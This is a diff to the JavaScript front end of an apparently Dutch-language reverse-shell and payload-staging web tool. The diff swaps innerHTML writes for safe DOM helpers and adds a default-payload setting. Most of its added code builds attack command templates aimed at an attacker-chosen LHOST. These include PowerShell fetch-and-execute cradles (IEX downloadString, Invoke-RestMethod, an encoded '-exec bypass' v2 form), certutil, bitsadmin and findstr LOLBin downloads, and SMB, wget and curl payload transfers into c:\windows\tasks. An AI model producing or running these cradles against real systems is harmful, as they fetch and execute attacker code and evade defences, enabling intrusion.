@@ -24,10 +24,23 @@
   // Helpers
   // -----------------------------------------------------------------------
 
-  function escapeHtml(s) {
-    var d = document.createElement('div');
-    d.appendChild(document.createTextNode(s));
-    return d.innerHTML;
+  function clearEl(el) {
+    while (el.firstChild) el.removeChild(el.firstChild);
+  }
+
+  function makeMsg(text, cls) {
+    var p = document.createElement('p');
+    p.className = cls || 'text-muted';
+    p.textContent = text;
+    return p;
+  }
+
+  function makeOption(value, label, selected) {
+    var opt = document.createElement('option');
+    opt.value = value;
+    opt.textContent = label;
+    if (selected) opt.selected = true;
+    return opt;
   }
 
   function copyToClipboard(text, btn) {
@@ -130,9 +143,9 @@
   }
 
   function renderShells(sections) {
-    shellContainer.innerHTML = '';
+    clearEl(shellContainer);
     if (!sections.length) {
-      shellContainer.innerHTML = '<p class="text-muted">Geen shells gevonden in bestand.</p>';
+      shellContainer.appendChild(makeMsg('Geen shells gevonden in bestand.'));
       return;
     }
     for (var i = 0; i < sections.length; i++) {
@@ -142,10 +155,12 @@
 
   function loadFile(filename) {
     if (!filename) {
-      shellContainer.innerHTML = '<p class="text-muted">Selecteer een bestaand bestand of genereer nieuwe reverse shells.</p>';
+      clearEl(shellContainer);
+      shellContainer.appendChild(makeMsg('Selecteer een bestaand bestand of genereer nieuwe reverse shells.'));
       return;
     }
-    shellContainer.innerHTML = '<p class="text-muted">Laden...</p>';
+    clearEl(shellContainer);
+    shellContainer.appendChild(makeMsg('Laden...'));
 
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '/api/reverseshells/files/' + encodeURIComponent(filename));
@@ -153,7 +168,8 @@
       if (xhr.status === 200) {
         renderShells(parseSections(xhr.responseText));
       } else {
-        shellContainer.innerHTML = '<p class="text-danger">Kon bestand niet laden.</p>';
+        clearEl(shellContainer);
+        shellContainer.appendChild(makeMsg('Kon bestand niet laden.', 'text-danger'));
       }
     };
     xhr.send();
@@ -168,12 +184,10 @@
       var files = data.files || [];
       var current = fileSelect.value;
 
-      fileSelect.innerHTML = '<option value="">-- selecteer bestand --</option>';
+      clearEl(fileSelect);
+      fileSelect.appendChild(makeOption('', '-- selecteer bestand --'));
       for (var i = 0; i < files.length; i++) {
-        var opt = document.createElement('option');
-        opt.value = files[i].name;
-        opt.textContent = files[i].name;
-        fileSelect.appendChild(opt);
+        fileSelect.appendChild(makeOption(files[i].name, files[i].name));
       }
 
       if (autoSelect && files.length > 0) {
@@ -223,22 +237,32 @@
   // -----------------------------------------------------------------------
 
   function renderCradles(ip, ps1Files) {
-    cradleContainer.innerHTML = '';
+    clearEl(cradleContainer);
     if (!ip) {
-      cradleContainer.innerHTML = '<p class="text-muted">Vul LHOST in en klik "Overzicht vernieuwen".</p>';
+      cradleContainer.appendChild(makeMsg('Vul LHOST in en klik "Overzicht vernieuwen".'));
       return;
     }
     if (!ps1Files.length) {
-      cradleContainer.innerHTML = '<p class="text-muted">Geen .ps1 tools gevonden in http/tools/.</p>';
+      cradleContainer.appendChild(makeMsg('Geen .ps1 tools gevonden in http/tools/.'));
       return;
     }
 
     for (var i = 0; i < ps1Files.length; i++) {
       var name = ps1Files[i];
+      var url = "http://" + ip + "/tools/" + name;
       var commands = [
-        "IEX(New-Object Net.WebClient).downloadString('http://" + ip + "/tools/" + name + "')",
-        "Invoke-WebRequest http://" + ip + "/tools/" + name + " | Invoke-Expression",
-        "powershell -Version 2 -exec bypass -enc " + unicodeB64("IEX(New-Object Net.WebClient).downloadString('http://" + ip + "/tools/" + name + "')")
+        // WebClient
+        "IEX(New-Object Net.WebClient).downloadString('" + url + "')",
+        // IWR
+        "IEX (Invoke-WebRequest '" + url + "' -UseBasicParsing).Content",
+        // IRM
+        "IEX (Invoke-RestMethod '" + url + "')",
+        // cmd wrapper
+        "cmd /c \"powershell -exec bypass -c IEX(New-Object Net.WebClient).downloadString('" + url + "')\"",
+        // PS v2 encoded
+        "powershell -Version 2 -exec bypass -enc " + unicodeB64("IEX(New-Object Net.WebClient).downloadString('" + url + "')"),
+        // SMB (needs share)
+        "IEX (Get-Content \\\\\\\\" + ip + "\\\\tools\\\\" + name + " -Raw)"
       ];
       cradleContainer.appendChild(makeCategory(name, commands));
     }
@@ -249,25 +273,45 @@
   // -----------------------------------------------------------------------
 
   function renderDownloads(ip, exeFiles) {
-    downloadContainer.innerHTML = '';
+    clearEl(downloadContainer);
     if (!ip) {
-      downloadContainer.innerHTML = '<p class="text-muted">Vul LHOST in en klik "Overzicht vernieuwen".</p>';
+      downloadContainer.appendChild(makeMsg('Vul LHOST in en klik "Overzicht vernieuwen".'));
       return;
     }
     if (!exeFiles.length) {
-      downloadContainer.innerHTML = '<p class="text-muted">Geen .exe tools gevonden in http/tools/.</p>';
+      downloadContainer.appendChild(makeMsg('Geen .exe tools gevonden in http/tools/.'));
       return;
     }
 
     for (var i = 0; i < exeFiles.length; i++) {
       var name = exeFiles[i];
+      var url = "http://" + ip + "/tools/" + name;
+      var dest = "c:\\windows\\tasks\\" + name;
       var commands = [
-        "certutil -urlcache -split -f http://" + ip + "/tools/" + name + " " + name,
-        "cmd.exe /c curl http://" + ip + "/tools/" + name + " -o C:\\Windows\\Tasks\\" + name,
-        "powershell -c (new-object System.Net.WebClient).DownloadFile('http://" + ip + "/tools/" + name + "','c:\\windows\\tasks\\" + name + "')",
-        "powershell iwr -uri http://" + ip + "/tools/" + name + " -o c:\\windows\\tasks\\" + name,
-        "bitsadmin /create 1 bitsadmin /addfile 1 http://" + ip + "/tools/" + name + " c:\\windows\\tasks\\" + name + " bitsadmin /RESUME 1 bitsadmin /complete 1",
-        "findstr /V /L W3AllLov3LolBas \\\\\\\\" + ip + "\\share\\tools\\" + name + " > c:\\windows\\tasks\\" + name
+        // curl (native Windows 10+)
+        "curl " + url + " -o " + dest,
+        // certutil LOLBin
+        "certutil -urlcache -split -f " + url + " " + dest,
+        // IWR
+        "powershell iwr -uri " + url + " -OutFile " + dest,
+        // WebClient.DownloadFile
+        "powershell -c \"(New-Object Net.WebClient).DownloadFile('" + url + "','" + dest + "')\"",
+        // BITS
+        "powershell -c \"Start-BitsTransfer -Source '" + url + "' -Destination '" + dest + "'\"",
+        // IRM
+        "powershell -c \"Invoke-RestMethod -Uri '" + url + "' -OutFile '" + dest + "'\"",
+        // bitsadmin
+        "bitsadmin /create 1 & bitsadmin /addfile 1 " + url + " " + dest + " & bitsadmin /RESUME 1 & bitsadmin /complete 1",
+        // SMB xcopy (needs share)
+        "xcopy \\\\" + ip + "\\tools\\" + name + " c:\\windows\\tasks\\ /Y",
+        // SMB robocopy (needs share)
+        "robocopy \\\\" + ip + "\\tools c:\\windows\\tasks " + name,
+        // findstr LOLBin via SMB (needs share)
+        "findstr /V /L W3AllLov3LolBas \\\\\\\\" + ip + "\\share\\tools\\" + name + " > " + dest,
+        // wget (Linux/WSL/Cygwin)
+        "wget " + url + " -O /tmp/" + name,
+        // Linux curl
+        "curl " + url + " -o /tmp/" + name
       ];
       downloadContainer.appendChild(makeCategory(name, commands));
     }
@@ -278,9 +322,9 @@
   // -----------------------------------------------------------------------
 
   function renderPayloads(payloads) {
-    payloadContainer.innerHTML = '';
+    clearEl(payloadContainer);
     if (!payloads.length) {
-      payloadContainer.innerHTML = '<p class="text-muted">Geen payloads gevonden in http/payloads/.</p>';
+      payloadContainer.appendChild(makeMsg('Geen payloads gevonden in http/payloads/.'));
       return;
     }
 
@@ -340,7 +384,6 @@
   function refreshOverview() {
     var ip = (lhostInput || {}).value ? lhostInput.value.trim() : '';
 
-    // Tools laden en cradles/downloads genereren
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '/api/reverseshells/tools');
     xhr.onload = function () {
@@ -352,13 +395,13 @@
     };
     xhr.send();
 
-    // Payloads laden
     var xhr2 = new XMLHttpRequest();
     xhr2.open('GET', '/api/reverseshells/payloads');
     xhr2.onload = function () {
       if (xhr2.status === 200) {
         var data = JSON.parse(xhr2.responseText);
         renderPayloads(data.payloads || []);
+        populateDefaultPayloadSelect(currentDefaultPayload);
       }
     };
     xhr2.send();
@@ -405,6 +448,120 @@
   }
 
   // -----------------------------------------------------------------------
+  // Standaard payload
+  // -----------------------------------------------------------------------
+
+  var defaultPayloadSelect = document.getElementById('default-payload');
+  var btnSaveDefault = document.getElementById('btn-save-default-payload');
+  var defaultPayloadStatus = document.getElementById('default-payload-status');
+  var defaultPayloadSection = document.getElementById('default-payload-section');
+  var defaultPayloadName = document.getElementById('default-payload-name');
+  var defaultPayloadCommands = document.getElementById('default-payload-commands');
+
+  var currentDefaultPayload = '';
+  var cachedHost = '';
+
+  function renderDefaultPayloadCommands(payload, host) {
+    if (!defaultPayloadSection || !payload) {
+      if (defaultPayloadSection) defaultPayloadSection.style.display = 'none';
+      return;
+    }
+    var ip = host || (lhostInput ? lhostInput.value.trim() : '') || cachedHost;
+    var url = 'http://' + ip + '/payloads/' + payload;
+    var dest = 'c:\\windows\\tasks\\' + payload;
+    var commands = [
+      // curl (native Windows 10+)
+      'curl ' + url + ' -o ' + dest,
+      // certutil LOLBin
+      'certutil -urlcache -split -f ' + url + ' ' + dest,
+      // IWR
+      'iwr -Uri \'' + url + '\' -OutFile \'' + dest + '\' -TimeoutSec 300',
+      // WebClient.DownloadFile
+      '(New-Object Net.WebClient).DownloadFile(\'' + url + '\',\'' + dest + '\')',
+      // BITS PowerShell
+      'Start-BitsTransfer -Source \'' + url + '\' -Destination \'' + dest + '\'',
+      // IRM
+      'Invoke-RestMethod -Uri \'' + url + '\' -OutFile \'' + dest + '\'',
+      // bitsadmin
+      'bitsadmin /create 1 & bitsadmin /addfile 1 ' + url + ' ' + dest + ' & bitsadmin /RESUME 1 & bitsadmin /complete 1',
+      // xcopy via SMB (needs share)
+      'xcopy \\\\' + host + '\\payloads\\' + payload + ' c:\\windows\\tasks\\ /Y',
+      // wget (Linux/WSL)
+      'wget ' + url + ' -O /tmp/' + payload,
+      // Linux curl
+      'curl ' + url + ' -o /tmp/' + payload,
+    ];
+    defaultPayloadSection.style.display = '';
+    defaultPayloadName.textContent = payload;
+    clearEl(defaultPayloadCommands);
+    defaultPayloadCommands.appendChild(makeCategory('Download commands', commands));
+  }
+
+  function populateDefaultPayloadSelect(selectedValue) {
+    if (!defaultPayloadSelect) return;
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/reverseshells/payloads');
+    xhr.onload = function () {
+      if (xhr.status !== 200) return;
+      var data = JSON.parse(xhr.responseText);
+      var payloads = data.payloads || [];
+      clearEl(defaultPayloadSelect);
+      defaultPayloadSelect.appendChild(makeOption('', '-- geen standaard --'));
+      for (var i = 0; i < payloads.length; i++) {
+        var sel = payloads[i].name === selectedValue;
+        defaultPayloadSelect.appendChild(makeOption(payloads[i].name, payloads[i].name, sel));
+      }
+    };
+    xhr.send();
+  }
+
+  function loadDefaultPayload() {
+    var xhr = new XMLHttpRequest();
+    xhr.open('GET', '/api/settings');
+    xhr.onload = function () {
+      if (xhr.status !== 200) return;
+      var data = JSON.parse(xhr.responseText);
+      currentDefaultPayload = data.default_payload || '';
+      cachedHost = (data.localhost || '').replace(/^https?:\/\//, '');
+      populateDefaultPayloadSelect(currentDefaultPayload);
+      if (currentDefaultPayload) {
+        renderDefaultPayloadCommands(currentDefaultPayload, cachedHost);
+      }
+    };
+    xhr.send();
+  }
+
+  if (btnSaveDefault) {
+    btnSaveDefault.addEventListener('click', function () {
+      var value = defaultPayloadSelect ? defaultPayloadSelect.value : '';
+      var xhr = new XMLHttpRequest();
+      xhr.open('POST', '/api/settings');
+      xhr.setRequestHeader('Content-Type', 'application/json');
+      xhr.onload = function () {
+        if (defaultPayloadStatus) {
+          defaultPayloadStatus.textContent = xhr.status === 200 ? 'Opgeslagen' : 'Mislukt';
+          setTimeout(function () { defaultPayloadStatus.textContent = ''; }, 2000);
+        }
+        currentDefaultPayload = value;
+        if (value) {
+          renderDefaultPayloadCommands(value, cachedHost);
+        } else if (defaultPayloadSection) {
+          defaultPayloadSection.style.display = 'none';
+        }
+      };
+      xhr.send(JSON.stringify({ default_payload: value }));
+    });
+  }
+
+  if (defaultPayloadSelect) {
+    defaultPayloadSelect.addEventListener('change', function () {
+      var value = defaultPayloadSelect.value;
+      if (value) renderDefaultPayloadCommands(value, cachedHost);
+      else if (defaultPayloadSection) defaultPayloadSection.style.display = 'none';
+    });
+  }
+
+  // -----------------------------------------------------------------------
   // Events
   // -----------------------------------------------------------------------
 
@@ -434,4 +591,5 @@
   // Bij page load
   loadFileList(true);
   refreshOverview();
+  loadDefaultPayload();
 })();
